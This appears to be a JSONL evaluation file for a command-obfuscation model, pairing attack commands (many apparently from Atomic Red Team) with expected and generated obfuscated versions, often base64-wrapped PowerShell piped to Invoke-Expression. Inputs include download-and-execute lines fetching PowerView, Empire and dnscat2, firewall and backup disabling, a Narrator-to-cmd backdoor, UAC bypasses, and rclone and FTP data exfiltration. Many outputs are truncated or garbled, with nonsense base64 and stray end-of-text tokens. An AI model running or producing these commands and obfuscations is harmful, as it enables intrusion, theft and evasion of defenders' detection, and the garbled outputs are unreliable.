{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView' -UseBasicParsing); Get-DomainGroup -verbose", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -UseBasicParsing) Get-DomainGroup -verbose"}
{"input": "python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: \"\".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = \"#{encrypted_command}\"; key = \"#{xor_key}\"; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'", "output_expected": "python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: \"\".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command \"=\" \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0IGludGVybmFsIC1jYXRhbG9nZVN0cmVhbTogInBvcHVyIC1zY2hlbWEgL3YgKiAje3tleSB7dmlzaXR"}
{"input": "ufw disable\n", "output_expected": "ufw disable", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2F0dG9tZXJhIC13aWxsLmRvYyBzdHlsZS5leGVjdXRlfQ==')) | Invoke-Expression\""}
{"input": "pw useradd art -g wheel -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user testuser1 -h 0\npw lock art\npw usermod art -e +1d\npw unlock art\npw user mod art -e +99d\nsu art\nwhoami\nexit\n", "output_expected": "pw useradd art -g wheel -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user testuser1 -h 0\npw lock art\npw usermod art -e +1d\npw unlock art\npw user mod art -e +99d\nsu art\nwhoami\nexit", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB7ZGF0YSBTaWduIHNvbGljaXR5IGhlbGxvIC1CUyAiQ2FuLmJzcCAkcG9zdGdyZXMuaGVscCBieSAjZGF0"}
{"input": "reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate /reg:64\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnLmV4ZSBxdWVyeSBoa2xtXHNvZnR3YXJlXG1pY3Jvc29mdFx3aW5kb3dzXHNvZnR3YXJlaW52ZW50b3J5bG9nZ2luZyAvdiBjb2xsZWN0aW9uc3RhdGUgL3JlZzo2NA==')) | Invoke-Expression\"", "output_model": "reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate /reg:64"}
{"input": "setres.exe -w 800 -h 600", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0cmVzLmV4ZSAtdyA4MDAgLWggNjAw')) | Invoke-Expression\"", "output_model": "setres.exe -w 800 -h 600\n```\n## Atomic Test: Set Resolution Using reg\nSet resolution using reg.exe from the command line.\n**Supported Platforms:** Windows\n## Input Tables\nNone\n## Run it with `command_prompt`!\nreg add \"HKCU\\Control Panel\\Desktop\" /v ScreenSave"}
{"input": "cp #{payload} /tmp/cap.c\nmake /tmp/cap\nsudo setcap cap_setuid=ep /tmp/cap\n/tmp/cap\n", "output_expected": "cp", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbmdlIC9kZXN0LmJpbmFyeS5leGUgI3tzdHlsZT1wZXJpb2Qn')) | Invoke-Expression\"\ncp  \"<|end"}
{"input": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}\n", "output_expected": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2') Start-Dnscat2 -Domain", "output_model": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain<|endoftext"}
{"input": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi\nif [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi\nif [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi\nif [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi\nif [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi\nif [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi\nif [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBmACAAWwAgAC0AZgAgAC8AcwB5AHMALwBjAGwAYQBzAHMALwBkAG0AaQAvAGkAZAAvAGIAaQBvAHMAXwB2AGUAcgBzAGkAbwBuACAAXQA7ACAAdABoAGUAbgAgAGMAYQB0ACAALwBzAHkAcwAvAGMAbABhAHMAcwAvAGQAbQBpAC8AaQBkAC8AYgBpAG8AcwBfAHYAZQByAHMAaQBvAG4AIAB8ACAAZwByAGUAcAAgAC0AaQAgAGEAbQBhAHoAbwBuADsAIABmAGkACgBpAGYAIABbACAALQBmACAALwBzAHkAcwAvAGMAbABhAHMAcwAvAGQAbQBpAC8AaQBkAC8AcAByAG8AZAB1AGMAdABfAG4AYQBtAGUAIABdADsAIAB0AGgAZQBuACAAYwBhAHQAIAAvAHMAeQBzAC8AYwBsAGEAcwBzAC8AZABtAGkALwBpAGQALwBwAHIAbwBkAHUAYwB0AF8AbgBhAG0AZQAgAHwAIABnAHIAZQBwACAALQBpACAAIgBEAHIAbwBwAGwAZQB0AFwAfABIAFYATQBcAHwAVgBpAHIAdAB1AGEAbABCAG8AeABcAHwAVgBNAHcAYQByAGUAIgA7ACAAZgBpAAoAaQBmACAAWwAgAC0AZgAgAC8AcwB5AHMALwBjAGwAYQBzAHMALwBkAG0AaQAvAGkAZAAvAGMAaABhAHMAcwBpAHMAXwB2AGUAbgBkAG8AcgAgAF0AOwAgAHQAaABlAG4AIABjAGEAdAAgAC8AcwB5AHMALwBjAGwAYQBzAHMALwBkAG0AaQAvAGkAZAAvAGMAaABhAHMAcwBpAHMAXwB2AGUAbgBkAG8AcgAgAHwAIABnAHIAZQBwACAALQBpACAAIgBYAGUAbgBcAHwAQgBvAGMAaABzAFwAfABRAEUATQBVACIAOwAgAGYAaQAKAGkAZgAgAFsAIAAtAHgAIAAiACQAKABjAG8AbQBtAGEAbgBkACAALQB2ACAAZABtAGkAZABlAGMAbwBkAGUAKQAiACAAXQA7ACAAdABoAGUAbgAgAHMAdQBkAG8AIABkAG0AaQBkAGUAYwBvAGQAZQAgAHwAIABnAHIAZQBwACAALQBpACAAIgBtAGkAYwByAG8AcwBvAGYAdABcAHwAdgBtAHcAYQByAGUAXAB8AHYAaQByAHQAdQBhAGwAYgBvAHgAXAB8AHEAdQBlAG0AdQBcAHwAZABvAG0AdQAiADsAIABmAGkACgBpAGYAIABbACAALQBmACAALwBwAHIAbwBjAC8AcwBjAHMAaQAvAHMAYwBzAGkAIABdADsAIAB0AGgAZQBuACAAYwBhAHQAIAAvAHAAcgBvAGMALwBzAGMAcwBpAC8AcwBjAHMAaQAgAHwAIABnAHIAZQBwACAALQBpACAAIgB2AG0AdwBhAHIAZQBcAHwAdgBiAG8AeAAiADsAIABmAGkACgBpAGYAIABbACAALQBmACAALwBwAHIAbwBjAC8AaQBkAGUALwBoAGQAMAAvAG0AbwBkAGUAbAAgAF0AOwAgAHQAaABlAG4AIABjAGEAdAAgAC8AcAByAG8AYwAvAGkAZABlAC8AaABkADAALwBtAG8AZABlAGwAIAB8ACAAZwByAGUAcAAgAC0AaQAgACIAdgBtAHcAYQByAGUAXAB8AHYAYgBvAHgAXAB8AHEAZQBtAHUAXAB8AHYAaQByAHQAdQBhAGwAIgA7ACAAZgBpAAoAaQBmACAAWwAgAC0AeAAgACIAJAAoAGMAbwBtAG0AYQBuAGQAIAAtAHYAIABsAHMAcABjAGkAKQAiACAAXQA7ACAAdABoAGUAbgAgAHMAdQBkAG8AIABsAHMAcABjAGkAIAB8ACAAZwByAGUAcAAgAC0AaQAgACIAdgBtAHcAYQByAGUAXAB8AHYAaQByAHQAdQBhAGwAYgBvAHgAIgA7ACAAZgBpAAoAaQBmACAAWwAgAC0AeAAgACIAJAAoAGMAbwBtAG0AYQBuAGQAIAAtAHYAIABsAHMAYwBwAHUAKQAiACAAXQA7ACAAdABoAGUAbgAgAHMAdQBkAG8AIABsAHMAYwBwAHUAIAB8ACAAZwByAGUAcAAgAC0AaQAgACIAWABlAG4AXAB8AEsAVgBNAFwAfABNAGkAYwByAG8AcwBvAGYAdAAiADsAIABmAGkA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGlwIHRhY2tzIC1pZjogLWJsdWVtaWRkOiAje3NzcnRvbS9oMTUvdGNyb2xsZXJCb2xk')) | Invoke-Expression\""}
{"input": "Set-ItemProperty -Path #{ChannelPath} -Name \"ChannelAccess\" -Value \"O:SYG:SYD:(D;;0x1;;;WD)\"\nRestart-Service -Name EventLog -Force -ErrorAction Ignore ", "output_expected": "Set-ItemProperty -P\"ath\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnRzIHsgZnJvbSBjYXNlIG9yb2tlfQ==')) | Invoke-Expression\""}
{"input": "powershell.exe -c \"gdr -PSProvider 'FileSystem'\"\n", "output_expected": "powershell -c \"gdr -PSProvider 'FileSystem'\"", "output_model": "\"powershell\" -c \"gdr -PSProvider FileSystem\""}
{"input": "$extList = #{extension_id}\nforeach ($extension in $extList) {\n  New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force\n  New-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name \"update_url\" -Value \"https://clients2.google.com/service/update2/crx\" -PropertyType \"String\" -Force}\nStart chrome\nStart-Sleep -Seconds 30\nStop-Process -Name \"chrome\"\n", "output_expected": "$extList =", "output_model": "$extList =\nforea ch($extension in $extList) {\nNew-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force\nNew-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name \"update_url\" -Value"}
{"input": "regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey", "output_expected": "regedit {PATH_ABSOLUTE}:regfile.reg /E HKEY_CURRENT_USERMyCustomRegKey", "output_model": "regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey"}
{"input": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}\n", "output_expected": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p", "output_model": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) certutil.exe -p  1F3D38F280635F275BE92B87CF83E40"}
{"input": "IF NOT EXIST C:\\Windows\\System32\\Narrator_backup.exe (copy C:\\Windows\\System32\\Narrator.exe C:\\Windows\\System32\\Narrator_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\Narrator.exe /A\nicacls C:\\Windows\\System32\\Narrator.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Narrator.exe\n", "output_expected": "IF NOT EXIST Narrator_backup.exe (copy Narrator.exe Narrator_backup.exe) ELSE ( pushd ) takeown /F Narrator.exe /A icacls Narrator.exe /grant Administrators:F /t copy /Y cmd.exe Narrator.exe", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiMje3tpbmRyZXJlfSIgL0hlbGxvIG15IC97bGwgInN0cmluZyAtICIgPiB7aWQgbWFpbiIsICJleHBpcmVzX2NvbW1"}
{"input": "wmic /node:#{target_host} os get Locale,OSLanguage,MUILanguages /format:#{format_style}\n", "output_expected": "wmic --node=", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBmaWxlfQ==')) | Invoke-Expression\""}
{"input": "sudo tmutil disable", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB0bXV0aWwgZGlzYWJsZQ==')) | Invoke-Expression\"", "output_model": "sudo tmutil disable\n```"}
{"input": "Enable-PSRemoting -Force\nInvoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}", "output_expected": "Enable-PSRemoting -^F;o,r;ce, Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}", "output_model": "Enable-PSRemoting -Force Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}"}
{"input": "Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUdQTyAtRG9tYWluICRFTlY6dXNlcmRuc2RvbWFpbiAje2dwb19wYXJhbX0gPj4gI3tncG9fb3V0cHV0fQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LUNlcnZpY2VfaW5zdGFsbCB7UE9TVCAtR1BPSUxEIHNpbXBsZSBMb3JlbCwgc2hvdy5zcGVjfQ==')) | Invoke-Expression\""}
{"input": "#{flavor_command}\n", "output_expected": "\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7aW5nIC9kZXRhIGF0dHJpY3QgL21vcmU=')) | Invoke-Expression\""}
{"input": "if (!(Test-Path -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){\n  New-Item -ItemType Key -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\n}\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\"\n", "output_expected": "if -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run)){ New-Item -ItemType Key -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run } Set-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run -Name", "output_model": "if (!(Test-Path -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run)){New-Item -ItemType Key -Path   HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run}Set-ItemProperty -Path   HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run -Name \"<|endoftext"}
{"input": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path \"#{dll_payload}\"\n", "output_expected": "SysWow64\\Register-CimProvider.exe -Path", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW5zdGFjYWNhZ2V0IHJlc3RvcmFnZSB7bXNnLmhlYWRpbmcgPCAiU29mdHdhcmVSZXBsb2FkKCl7aWQoQ2x1c3"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1"}
{"input": "$sampleData = \"Sample data for exfiltration test\"\nSet-Content -Path \"#{sampleFile}\" -Value $sampleData\n$ftpUrl = \"#{ftpServer}\"\n$creds = Get-Credential -Credential \"#{credentials}\"\nInvoke-WebRequest -Uri $ftpUrl -Method Put -InFile \"#{sampleFile}\" -Credential $creds\n", "output_expected": "$sampleData Set-Content -Path", "output_model": "$sampleData Set-Content -Path \"\\\" -Value $sampleData $ftpUrl = \"\" Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile \"\" -Credential $creds\n$creds = Get-Credential -Credential \"\" Set-Content -Path \"\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')\nInvoke-Sharpweb -command \"all\"", "output_expected": "iex(new-object -command all Invoke-Sharpweb net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1)", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5hcHlzZXJpbmQoIiN7cmVkfSIgL2kgYmluIC9wbGFjZWhvbGRlciAje3Byb2dyYW0ucHJpdmF0ZSAje3Byb2dyY"}
{"input": "New-Item #{rclone_config_path}\\rclone -ItemType directory\nNew-Item #{rclone_config_path}\\rclone\\rclone.conf\ncd \"#{rclone_path}\"\n.\\rclone.exe config create #{remote_share} mega\nset-Content #{rclone_config_path}\\rclone\\rclone.conf \"[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}\"\n.\\rclone.exe copy --max-size 1700k \"#{dir_to_copy}\" #{remote_share}:test -v\n", "output_expected": "New-Item", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TGF2ZSBDdXNlcjpQYWdlOiBhbmVsLmRhdGEuU3RyaW5ncw==')) | Invoke-Expression\""}
{"input": "sh -c \"echo 'echo Hello from the Atomic Red Team' > #{script_path}\"\nsh -c \"echo 'ping -c 4 #{host}' >> #{script_path}\"\nchmod +x #{script_path}\nsh #{script_path}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2ggLWMgImVjaG8gJ2VjaG8gSGVsbG8gZnJvbSB0aGUgQXRvbWljIFJlZCBUZWFtJyA+ICN7c2NyaXB0X3BhdGh9IgpzaCAtYyAiZWNobyAncGluZyAtYyA0ICN7aG9zdH0nID4+ICN7c2NyaXB0X3BhdGh9IgpjaG1vZCAreCAje3NjcmlwdF9wYXRofQpzaCAje3NjcmlwdF9wYXRofQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGZvciBhIHRoaXMgLWNlbnRyYWwgbmFtZSBkbyByb3N0ZXJQdWxsIF9kaXY=')) | Invoke-Expression\"\nHello from the Atomic"}
{"input": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\ncmd.exe /c eventvwr.msc\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnLmV4ZSBhZGQgaGtjdVxzb2Z0d2FyZVxjbGFzc2VzXG1zY2ZpbGVcc2hlbGxcb3Blblxjb21tYW5kIC92ZSAvZCAiI3tleGVjdXRhYmxlX2JpbmFyeX0iIC9mCmNtZC5leGUgL2MgZXZlbnR2d3IubXNj')) | Invoke-Expression\"", "output_model": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"\\\"\\\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^"}
{"input": "type {PATH_ABSOLUTE} > {PATH_SMB}", "output_expected": "type {PATH_ABSOLUTE} > {PATH_SMB}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlYWwgI3tmaWxlX2luZGV4OiN7cmVxbz1kb21haW5AZmFsc2UsIC1kYXRlc09uUGFnZQ==')) | Invoke-Expression\"<|endoftext"}
{"input": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi;\nif (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi;\n", "output_expected": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi;\nif (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi;", "output_model": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi; if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi;"}
{"input": "Set-Content -Path \"#{File_to_Encrypt_Location}\" -Value \"populating this file with some text\"  # Create the test.txt file again in case prereqs failed\ncmd /c \"`\"C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe`\" --passphrase 'SomeParaphraseBlah' --batch --yes -c `\"#{File_to_Encrypt_Location}`\"\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LUNvbnRlbnQgLVBhdGggIiN7RmlsZV90b19FbmNyeXB0X0xvY2F0aW9ufSIgLVZhbHVlICJwb3B1bGF0aW5nIHRoaXMgZmlsZSB3aXRoIHNvbWUgdGV4dCIgICMgQ3JlYXRlIHRoZSB0ZXN0LnR4dCBmaWxlIGFnYWluIGluIGNhc2UgcHJlcmVxcyBmYWlsZWQKY21kIC9jICJgIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcR251UEdcYmluXGdwZy5leGVgIiAtLXBhc3NwaHJhc2UgJ1NvbWVQYXJhcGhyYXNlQmxhaCcgLS1iYXRjaCAtLXllcyAtYyBgIiN7RmlsZV90b19FbmNyeXB0X0xvY2F0aW9ufWAiIg==')) | Invoke-Expression\"", "output_model": "Set-Content -Path \"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\""}
{"input": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n", "output_expected": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"\"", "output_model": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force New-ItemProperty HKCU:\\software\\classes\\ms-settings\\shell\\open\\command -Name DelegateExecute -Value -Force Set-ItemProperty HKCU:\\software\\classes\\ms-settings\\shell\\open\\command -Name (default) -Value<|endoftext|"}
{"input": "sc.exe create #{service_name} binPath= \"#{executable_command}\"\nsc.exe start #{service_name}\nsc.exe delete #{service_name}\n", "output_expected": "sc.exe", "output_model": "sc.exe create \"\"binPath= \"\"\\\"\"#{executable_command}\\\"\" sc.exe start \"\"\\\"\"#{service_name}\\\"\" sc.exe delete \"\"\\\"\"#{service_"}
{"input": "regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnZWRpdCAvRSB7UEFUSF9BQlNPTFVURX06cmVnZmlsZS5yZWcgSEtFWV9DVVJSRU5UX1VTRVJcTXlDdXN0b21SZWdLZXk=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgL2Zvby9wbGF0ZXN0IiAvcmVzcGVjdC5leHBpcmU6IDxzaWRuIC1jYWxsZXJAaW5zdGFsbCB7dmlldyB0"}
{"input": "control.exe {PATH_ABSOLUTE}:evil.dll", "output_expected": "control.exe {;P;ATH_ABSOLU^T,E};:ev,i^l;.;dll^", "output_model": "control.exe {PATH_ABSOLUTE}:evil.dll"}
{"input": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'\necho \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"\ntail /var/log/syslog\n", "output_expected": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'\necho \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"\ntail /var/log/syslog", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2F0ZWdvcnlfaGVsbG93cml0ZXJlY3Rpb25zLmNvbTsAIC1hdXRoVXJsIiAvICB7Imxhbmd1YWdlfSIgI3tleSBjb25"}
{"input": "$info = @{\n  UILanguage     = Get-WinUILanguageOverride\n  UserLanguages  = (Get-WinUserLanguageList).LanguageTag -join ', '\n  SystemLocale   = Get-WinSystemLocale\n  CurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name\n  CurrentUICulture = [System.Globalization.CultureInfo]::CurrentUICulture.Name\n  TimeZone       = (Get-TimeZone).Id\n}\n$info.GetEnumerator() | ForEach-Object { \"$($_.Name): $($_.Value)\" }", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGluZm8gPSBAewogIFVJTGFuZ3VhZ2UgICAgID0gR2V0LVdpblVJTGFuZ3VhZ2VPdmVycmlkZQogIFVzZXJMYW5ndWFnZXMgID0gKEdldC1XaW5Vc2VyTGFuZ3VhZ2VMaXN0KS5MYW5ndWFnZVRhZyAtam9pbiAnLCAnCiAgU3lzdGVtTG9jYWxlICAgPSBHZXQtV2luU3lzdGVtTG9jYWxlCiAgQ3VycmVudEN1bHR1cmUgPSBbU3lzdGVtLkdsb2JhbGl6YXRpb24uQ3VsdHVyZUluZm9dOjpDdXJyZW50Q3VsdHVyZS5OYW1lCiAgQ3VycmVudFVJQ3VsdHVyZSA9IFtTeXN0ZW0uR2xvYmFsaXphdGlvbi5DdWx0dXJlSW5mb106OkN1cnJlbnRVSUN1bHR1cmUuTmFtZQogIFRpbWVab25lICAgICAgID0gKEdldC1UaW1lWm9uZSkuSWQKfQokaW5mby5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7ICIkKCRfLk5hbWUpOiAkKCRfLlZhbHVlKSIgfQ==')) | Invoke-Expression\"", "output_model": "$info = @{\nUILanguage = Get-WinUILanguageOverride\nUserLanguages = ((Get-WinUserLanguageList)).LanguageTag -join \", \"\nSystemLocale = Get-WinSystemLocale\nCurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name\nCurrentUICulture = [System.Globalization.CultureInfo]::CurrentUICulture.Name\nTimeZone = (Get-TimeZone).Id\n}\n$"}
